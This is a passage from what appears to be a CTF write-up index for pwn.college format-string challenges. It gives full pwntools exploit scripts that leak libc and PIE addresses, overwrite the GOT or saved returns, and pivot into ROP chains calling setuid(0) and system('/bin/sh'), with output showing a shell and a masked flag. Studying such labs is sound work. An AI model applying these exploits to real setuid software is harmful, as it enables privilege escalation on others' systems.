for safety. </p> <p>To retain privileges, first make the real/effective/saved UIDs all zero (e.g., call <code>setuid(0)</code> or <code>setresuid(0,0,0)</code>) before <code>execve</code>-ing a shell; alternatively, exec a shell in privileged mode (e.g., <code>bash -p</code>) so it doesn\u2019t discard the elevated EUID. Otherwise, your \u201croot shell\u201d will immediately lose root.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level10.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level10.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nb *func+444\ncontinue\nc\nc\nsi\nnextret\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Partial RELRO\n# Stack:      No canary found\n# NX:         NX enabled\n# PIE:        No PIE (0x400000)\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'printf on your input and then exit.\\n', payload)\n\nio = start()\n\n####################################\n####### Redirect exit to func ######\n####################################\n\nf = FmtStr(send_fmt, offset=46, padlen=4, numbwritten=0x6c)\nf.write(exe.got['exit'], exe.sym.func)\nf.execute_writes()\n\n\n####################################\n#### Leak Part #####################\n####################################\n\npayload = flat('%3$p|%161$p|%164$p|')\nsend_fmt(payload)\nio.recvuntil(b'Your input is:')\nio.recvline()\n\nleaks = io.recvline().split(b'|')\n\nleak_write23= int(leaks[0], 16)\nleak_canary = int(leaks[1], 16)\nrbp_addr    = int(leaks[2], 16)-0xa00\n\nlibc.address = leak_write23 - 0x10e297 # offset of write+23\n\nsuccess(f'LIBC Base Address: {libc.address:#x}')\nsuccess(f'Canary Value     : {leak_canary:#x}')\nsuccess(f'RBP Address      : {rbp_addr:#x}')\nsuccess(f'Exe Base Address : {exe.address:#x}')\n\n####################################\n#### Write Part ####################\n####################################\n\ntarget_address = exe.bss()+0x680\n\nsuccess(f'Target address: {target_address:#x}')\n\n###### rop chain generation ########\nrop = ROP([exe, libc])\n\nbinsh = next(libc.search(b'/bin/sh\\0'))\nret         = rop.find_gadget(['ret'])[0]\n\nrop.call('setuid', [0])\nrop.raw(ret)\nrop.call(libc.sym.system, [binsh])\n\n#############################################\n#### write ropchain into .bss segment #######\n#############################################\n\nfor idx, c in enumerate(rop.build()):\n    f.write(target_address+(8*idx), c)\n\n\n######## redirect code execution ##################\npop_rsp     = rop.find_gadget(['pop rsp', 'ret'])[0]\n\n\n\nf.write(rbp_addr-0x4f8, pop_rsp)        # ---&gt; printf return address\nf.write(rbp_addr-0x4f0, target_address) # ---&gt; printf return address+8\n#f.write(target_address, 0xdeadbabe)\n\nf.execute_writes()\n\nio.interactive()\n</code></pre> <p>The Result:</p> <p></p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#references","title":"References","text":"<p>Red Hat blog explaining RELRO modes, GOT/PLT relocation, and memory protections RELRO (Partial vs Full) and GOT overwrites</p> <p>Basics of overwriting GOT entries to redirect control flow GOT/PLT primer for pwning</p> <p>Detailed GOT/PLT behavior for exploitation All about the GOT (ELF internals)</p> <p>Using fake relocation tables to call arbitrary functions via the dynamic linker ret2dlresolve technique overview</p> <p>How to hijack exit handlers for code execution Abusing exit handlers</p> <p>Exploiting libc exit functions and destructors Notes on __exit_funcs / tls_dtor_list</p> <p>Forging _IO_FILE structures for exploitation (File Structure Oriented Programming) FSOP context on modern glibc</p> <p>Explanation of the endbr64 instruction for Intel CET IBT What endbr64 does (IBT)</p> <p>Presentation on CET, IBT, and SHSTK on Linux CET slide deck (Linux Plumbers)</p> <p>Building ROP chains with pwntools, including ret2csu support Pwntools ROP API docs</p> <p>Sigreturn Oriented Programming with pwntools Pwntools SROP helper docs</p> <p>Official AMD64 System V ABI documentation SysV AMD64 ABI doc (Linux)</p> <p>Practical summary of SysV calling conventions Calling conventions summary (OSDev)</p> <p>Bash documentation on privilege dropping for setuid programs Shells drop privileges when started setuid</p> <p>Dash man page note on setuid privilege behavior Dash shell drops setuid privileges</p> <p>MITRE ATT&amp;CK technique for exploiting setuid binaries MITRE ATT&amp;CK on setuid abuse</p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/","title":"Format String Attack - Format String Attack Twice (Full RELRO + PIE)","text":"<p>Simple and quick PoC. Same approach used in Format String Attack Once (Partial RELRO + no PIE)</p> <p>Nothing different than previous post.</p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/#babyfmt_level110","title":"babyfmt_level11.0","text":"<pre><code>root@b0cae43b352f:/host# checksec ./babyfmt_level11.0\n[*] '/host/babyfmt_level11.0'\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/#leak-addresses","title":"Leak Addresses","text":"<pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level11.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level11.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nbrva 0x16ab\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Full RELRO\n# Stack:      No canary found\n# NX:         NX enabled\n# PIE:        PIE enabled\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\n\ndef send_fmt(payload):\n    io.sendafter(b'your input and then exit.\\n', payload)\n\nio = start()\n\n\n###################################\n######## Leak Part ################\n###################################\n\npayload = flat('%184$lx|%185$lx|%195$lx')\nio.sendafter(b'your input again.\\n', payload)\n\nio.recvuntil(b'input is:')\nio.recvline()\n\nleaked = io.recvline().strip().split(b'|')\n\nrbp_leak    = int(leaked[0], 16) - 0x50 ## 0x50 bytes before leaked address\nexe.address = int(leaked[1], 16) - 0x184b\nlibc.address= int(leaked[2], 16) - 0x24083\n\nsuccess(f'RBP Addr      : {rbp_leak:#x}')\nsuccess(f'PIE Base Addr : {exe.address:#x}')\nsuccess(f'LIBC Base Addr: {libc.address:#x}')\nsuccess(f'BSS Address   : {exe.bss():#x}')\n\ntarget_addr = exe.bss()+0xde0\nsuccess(f'Target Address: {target_addr:#x}')\n\n\n###################################\n######## rop chain write ##########\n###################################\n\n\n\n###################################\n######## redirect code exec #######\n###################################\n\n\nio.interactive()\n</code></pre> <p>The Result:</p> <pre><code>[+] Starting local process '/usr/bin/gdbserver': pid 496\n[*] running in new terminal: ['/usr/bin/gdb', '-q', '/host/babyfmt_level11.0_remotelibc', '-x', '/tmp/pwnlib-gdbscript-xj8nmj9y.gdb']\n/host/exploit.py:68: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  payload = flat('%184$lx|%185$lx|%195$lx')\n[+] RBP Addr      : 0x7ffe6ad4c7e0\n[+] PIE Base Addr : 0x55ce64d25000\n[+] LIBC Base Addr: 0x7f417cc00000\n[+] BSS Address   : 0x55ce64d29020\n[+] Target Address: 0x55ce64d29e00\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/#find-offset-and-padlen-values","title":"find offset and padlen values","text":"<pre><code>[+] Receiving all data: Done (111B)\n[*] Process '/host/babyfmt_level11.0' stopped with exit code 0 (pid 296)\n[DEBUG] Received 0x6f bytes:\n    b'Here is the result:\\n'\n    b'Your input is:                              \\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161636161616261END'\n[*] Found format string offset: 58\n[+] User input starts at  : 58\n[+] Needed pads           :3\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/#get_flagpy","title":"get_flag.py","text":"<pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level11.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level11.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nbrva 0x16a6\ncontinue\nsi\nnextret\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Full RELRO\n# Stack:      No canary found\n# NX:         NX enabled\n# PIE:        PIE enabled\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\n\ndef send_fmt(payload):\n    io.sendafter(b'your input and then exit.\\n', payload)\n\nio = start()\n\n\n###################################\n######## Leak Part ################\n###################################\n\npayload = flat('%184$p|%185$p|%195$p')\nio.sendafter(b'your input again.\\n', payload)\n\nio.recvuntil(b'input is:')\nio.recvline()\n\nleaked = io.recvline().strip().split(b'|')\n\nrbp_leak    = int(leaked[0], 16) - 0x50 ## 0x50 bytes before leaked address\nexe.address = int(leaked[1], 16) - 0x184b\nlibc.address= int(leaked[2], 16) - 0x24083\n\nsuccess(f'RBP Addr      : {rbp_leak:#x}')\nsuccess(f'PIE Base Addr : {exe.address:#x}')\nsuccess(f'LIBC Base Addr: {libc.address:#x}')\nsuccess(f'BSS Address   : {exe.bss():#x}')\n\ntarget_addr = exe.bss()+0xde0\nsuccess(f'Target Address: {target_addr:#x}')\n#==========================================#\n#========= FmtStr Object ==================#\n#==========================================#\noffset = 58\npadlen = 3\n\nf = FmtStr(send_fmt, offset=58, padlen=3, numbwritten=0x2d)\n\n\n###################################\n######## rop chain write ##########\n###################################\nrop = ROP([exe, libc])\n\nbinsh   = next(libc.search(b'/bin/sh\\0'))\nret     = rop.find_gadget(['ret'])[0]\n\nrop.call('setuid', [0])\nrop.raw(ret)\nrop.call(libc.sym.system, [binsh])\n\nfor idx, c in enumerate(rop.build()):\n    f.write(target_addr+(8*idx), c)\n\n###################################\n######## redirect code exec #######\n###################################\npop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]\n\nprintf_saved_ret  = rbp_leak - 0x598\nprintf_saved_ret8 = rbp_leak - 0x590\n\nf.write(printf_saved_ret, pop_rsp)\nf.write(printf_saved_ret8, target_addr)\n\nf.execute_writes()\n\nio.interactive()\n</code></pre> <p>The result:</p> <pre><code>[+] Starting local process '/host/babyfmt_level11.0_remotelibc': pid 735\n/host/exploit.py:68: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  payload = flat('%184$p|%185$p|%195$p')\n[+] RBP Addr      : 0x7fff0beeba90\n[+] PIE Base Addr : 0x55e273855000\n[+] LIBC Base Addr: 0x7f32942a2000\n[+] BSS Address   : 0x55e273859020\n[+] Target Address: 0x55e273859e00\n[*] Loaded 19 cached gadgets for '/host/babyfmt_level11.0_remotelibc'\n[*] Loaded 195 cached gadgets for '/root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so'\n[*] Switching to interactive mode\nHere is the result:\nYour input is:                              \nefy                               #                \\x00                             \\x97                \\x14   Y                                        \\x00     \\x9d                              \\x00                             \\x00                         \\x00                                                                                                    \\x00     \\x00              \\x00                                                                             \\x00                             \\x00                                              \\x00ccc     \\         \\x00ccc               _          \\x80    \\xf8ccc          t           \\x8a                                                                                                                                \\xc4         \\xa0            \\x00                     H    D                                  \\x00                             \\xa0           \\x00     \\x00              p         \\xc1                                                                   _\\x10\\x9e\\x85s\\xe2U$  \n$ \n$ cat /flag\npwn.college{01eD**********************************EzW}\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/#references","title":"References","text":"<p>Format string exploitation tutorial Format String Exploitation (Shellphish)</p> <p>Pwntools documentation (ROP, fmtstr_payload, primitives) Pwntools Documentation</p> <p>PLT/GOT, relocations, late binding explained Dynamic Linking and the GOT/PLT</p> <p>ret2libc overview and calling conventions recap System V AMD64 ABI</p> <p>PIE &amp; RELRO behavior and impact on exploits RELRO (Partial vs Full) and GOT overwrites</p> <p>Intel CET overview (IBT/endbr64, SHSTK) Linux Shadow Stack (SHSTK) &amp; IBT</p> <p>Using pwntools ROP helpers (chain building, gadgets) Pwntools ROP API docs</p> <p>SROP helper and SigreturnFrame (if gadgets are scarce) Pwntools SROP helper docs</p> <p>Practical write-up on GOT/PLT for pwning All about the GOT (ELF internals)</p> <p>GDB tips (pwndbg) for inspecting stacks/sections pwndbg Documentation</p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","pie","relro","cet","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/","title":"Format String Attack - No Dollar Payload","text":"<p>This variant like Format String Attack Twice (Full RELRO + PIE)|Twice Format String Attack . This time format string payloads can not contains $ character.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/#babyfmt_level120","title":"babyfmt_level12.0","text":"<pre><code>root@aaca0d8e13c0:/host# checksec ./babyfmt_level12.0\n[*] '/host/babyfmt_level12.0'\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/#custom-fmtstr-class-fmtstriso","title":"custom FmtStr Class (FmtStrIso)","text":"<p>There is nothing fancy here.  Borrowed FmtStr Class from pwntools and updated some fields.</p> <p>Notes about the updated fields:</p> <ul> <li> <p><code>find_offset()</code> normally works with <code>$</code>-style format specifiers. This version uses old-school detection: a hardcoded 200\u00d7 <code>%p|</code> sequence.</p> </li> <li> <p>The same change was made in <code>leak_stack()</code>.</p> </li> <li> <p><code>execute_writes()</code> uses <code>no_dollar=True</code> by default (was <code>False</code> in pwntools).</p> </li> <li> <p>Added <code>_leaker</code> dereference support. It\u2019s not strictly necessary.</p> </li> </ul> <pre><code>#...\n#...\n#...\nclass FmtStrIso(object):\n    \"\"\"\n    pwntools-like API, but works WITHOUT $ in the format string.\n    - find_offset(): one-shot %p scan to find offset+padlen\n    - leak_stack():  %p chain for stack leaks\n    - _leaker():     advance with %c, read with %s (addr appended later)\n    - execute_writes(): fmtstr_payload(..., no_dollars=True)\n    \"\"\"\n\n    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0, badbytes=frozenset()):\n        self.execute_fmt = execute_fmt\n        self.offset = offset\n        self.padlen = padlen\n        self.numbwritten = numbwritten\n        self.badbytes = badbytes\n\n        if self.offset is None:\n            self.offset, self.padlen = self.find_offset()\n            if self.offset is None:\n                log.error(\"Could not auto-detect offset/padlen (no-$)\")\n            else:\n                log.info(\"Found format string offset (no-$): %d (padlen=%d)\", self.offset, self.padlen)\n\n        self.writes = {}\n        self.leaker = MemLeak(self._leaker)\n\n    # ---------- STACK LEAK WITHOUT $ ----------\n    def leak_stack(self, offset, prefix=b\"\"):\n        \"\"\"\n        Leak stack argument without using $:\n          START (%p|) * (offset-1)  +  %p END\n        The final %p prints the target argument (as '0x...' hex string).\n        \"\"\"\n        assert offset &gt;= 1\n        fmt = b\"START\" + (b\"%p|\" * (offset - 1)) + b\"%pEND\"\n        leak = self.execute_fmt(prefix + fmt)\n        try:\n            between = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0]\n            last = between.split(b\"|\")[-1].strip()\n            return int(last, 16) if last.startswith(b\"0x\") else 0\n        except Exception:\n            return 0\n\n    # ---------- AUTO-DETECT OFFSET+PADLEN WITHOUT $ ----------\n    def find_offset(self, max_args=200):\n        \"\"\"\n        Detect offset+padlen with a single payload (no-$).\n        Logic:\n          - prefix with cyclic(20) marker\n          - use \"START %p|%p|...%p END\" for max_args arguments\n          - parse tokens (0x...) int-&gt;pack-&gt;first 4 bytes\n          - use cyclic_find to locate marker position (padlen)\n          - token index = offset\n        Fallback: brute force with leak_stack (still no-$).\n        \"\"\"\n        marker = cyclic(20)\n        fmt = b\"START\" + (b\"%p|\" * max_args) + b\"END\"\n        leak = self.execute_fmt(marker + fmt)\n\n        m = re.findall(br\"START(.*?)END\", leak, re.DOTALL)\n        if m:\n            between = m[0].strip(b\"|\")\n            tokens = [t for t in between.split(b\"|\") if t]\n            for idx, tok in enumerate(tokens, start=1):\n                try:\n                    if not tok.startswith(b\"0x\"): \n                        continue\n                    ptr = int(tok, 16)\n                    pos = cyclic_find(pack(ptr)[:4])\n                    if 0 &lt;= pos &lt; 20:\n                        return idx, pos\n                except Exception:\n                    continue\n\n        # Fallback: slower but reliable, try each one\n        for off in range(1, 1000):\n            val = self.leak_stack(off, marker)\n            pos = cyclic_find(pack(val)[:4])\n            if 0 &lt;= pos &lt; 20:\n                return off, pos\n\n        return None, None\n\n    # ---------- LEAK FROM ARBITRARY ADDRESS WITHOUT $ ----------\n    def _leaker(self, addr):\n        # ELF header hack (copied from pwntools)\n        if addr &amp; 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == b\"ELF\":\n            return b\"\\x7f\"\n\n        # consume (offset-1) arguments with %c, then use %s for the target address\n        advance = max(0, (self.offset or 1) - 1)\n        fmt = b\"START\" + (b\"%c\" * advance) + b\"%sEND\"\n\n        # one dummy word per %c, actual pointer for the final %s\n        dummy = b\"\".join(pack(0) for _ in range(advance))\n        ptr   = pack(addr)\n        args  = dummy + ptr\n\n        # payload layout: [padlen: fmt][padlen+len(fmt): args]\n        fmtstr = fit({\n            self.padlen: fmt,\n            self.padlen + len(fmt): args,\n        })\n\n        leak = self.execute_fmt(fmtstr)\n        try:\n            data = re.findall(br\"START(.*)END\", leak, re.MULTILINE | re.DOTALL)[0]\n        except Exception:\n            data = b\"\"\n        return data + b\"\\x00\"\n\n    # ---------- WRITE WITHOUT $ ----------\n    def execute_writes(self):\n        \"\"\"\n        Emit and send planned writes in NO-DOLLARS mode.\n        \"\"\"\n        fmtstr = randoms(self.padlen).encode()\n        fmtstr += fmtstr_payload(\n            self.offset,\n            self.writes,\n            numbwritten=self.padlen + self.numbwritten,\n            badbytes=self.badbytes,\n            write_size='byte',\n            no_dollars=True,  # critical\n        )\n        self.execute_fmt(fmtstr)\n        self.writes = {}\n\n    def write(self, addr, data):\n        self.writes[addr] = data\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF","no-dollar-payload"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/13-Format-String-Attack-No-Dollar-Payload/#get_flagpy","title":"get_flag.py","text":"<p>The PoC was a mess. I either need to reconstruct it or change the target.</p> <p>At one point, I could have just set the gadgets and called them directly, but instead I built a workaround. I still have some questions in my mind that I haven\u2019t dug into yet. When I tried to write during the again.\\n phase, the binary crashed.</p> <p>So I kept it simple and wrote the ROP payload during the exit.\\n phase instead.</p> <p>Here\u2019s what happens:</p> <ul> <li> <p>First, I overwrite the function\u2019s saved return address with the function itself. Because there was a padding issue, I added a <code>ret</code> instruction to align the stack to 16 bytes.</p> </li> <li> <p>Next, when the function\u2019s saved return address gets pushed 8 bytes onto the stack, I overwrite it with a <code>pop rsp</code> gadget and the <code>.bss</code> address. <pre><code>Higher addresses\n\u2502 \u2026 caller \u2026\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 saved RBP              (old_rbp)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 [rbp+0x08] = ret              \u2190 saved RIP # -&gt; 1st turn saved RIP\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 [rbp+0x10] = exe.sym.func     \u2190 saved RIP # -&gt; 1st turn saved RIP+8\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 [rbp+0x18] = pop_rsp          \u2190 saved RIP # -&gt; 2nd turn saved rip\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 [rbp+0x20] = bss              \u2190 data for pop_rsp\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502   \u2026 locals \u2026\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre></p> </li> <li> <p>On the second run, the ROP gadgets are already placed at the <code>.bss</code> address. So when control flows there, the gadgets are ready to execute.</p> </li> <li> <p>Offset, padlen and numbwritten values detected same as previous posts.</p> </li> </ul> <pre><code>from pwn import *\nimport subprocess, re\nfrom fmtstr_nodollar import FmtStrIso\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level12.0')\nexe.log_level = 'debug'\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv,*a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nbrva 0x17b2\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Full RELRO\n# Stack:      Canary found\n# NX:         NX enabled\n# PIE:        PIE enabled\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\nio = start()\n\n#### Leak Part ####\n\n### offsets ###\nlibc_start_main_offset  = 0x24083\nmain_406_offset         = 0x1949\n\n#payload = flat('a'+'%lx|'*63+'\\x00', # e0d8\n#               'AAAAAAAA')\n\ndef add_align_padding(payload: bytes, align: int = 16, call_adjust: int = 8, pad_byte: bytes =b\"a\", adjust: int = 0) -&gt; bytes:\n    payload_len = len(payload)\n    misalign = (payload_len + call_adjust) % align\n    padlen = (align - misalign) % align\n    padlen = max(0, padlen + adjust)   # adjust ile oynayabilirsin (+/- de\u011fer)\n    return pad_byte*padlen + payload\n\nformat_pyld  = b'a'*16\nformat_pyld += b'%c'*141+b'|%p' #32 -&gt; 0xe008\nformat_pyld += b'|%p'*11#'%c'*3+'|%p'\nformat_pyld += b'\\x00'\n\npayload = flat(add_align_padding(format_pyld, adjust=1),\n               )\n\nprint(f'payload length: {len(payload)}')\n\nio.sendafter(b'again.\\n', payload)\n\nio.recvuntil(b'input is:')\nio.recvline()\n#info(f'Here: {io.recvline().strip().split(b\"|\")}')\n\nleaks = io.recvline().strip().split(b'|')\n\nlibc_start_main_leak= int(leaks[13],16)\npie_leak            = int(leaks[3], 16)\nrbp_leak            = int(leaks[2], 16)-0x50\n\nlibc.address= libc_start_main_leak - libc_start_main_offset\nexe.address = pie_leak - main_406_offset\n\nsuccess(f'RBP Address   :{rbp_leak:#x}')\nsuccess(f'PIE Base Addr :{exe.address:#x}')\nsuccess(f'LIBC Base Addr:{libc.address:#x}')\n\n###############################\n##### overwrite part ##########\n###############################\n\nbss_offset = 0x4800\nbss = exe.address + bss_offset\nsuccess(f'BSS Addr: {bss:#x}')\n\nrop = ROP([exe, libc])\n#### overwrite gadgets for shell ####\n\npop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]\nret     = rop.find_gadget(['ret'])[0]\nbinsh = next(libc.search(b'/bin/sh\\0'))\n\ndef exec_fmt_again(payload: bytes) -&gt; bytes:\n    io.sendafter(b'again.\\n', payload)\n\n\ndef exec_fmt_exit(payload: bytes) -&gt; bytes:\n    io.sendafter(b'exit.\\n', payload)\n\n#=========================================================#\n#================ Execute func one more time =============#\n#=========================================================#\n\n\nf_exit = 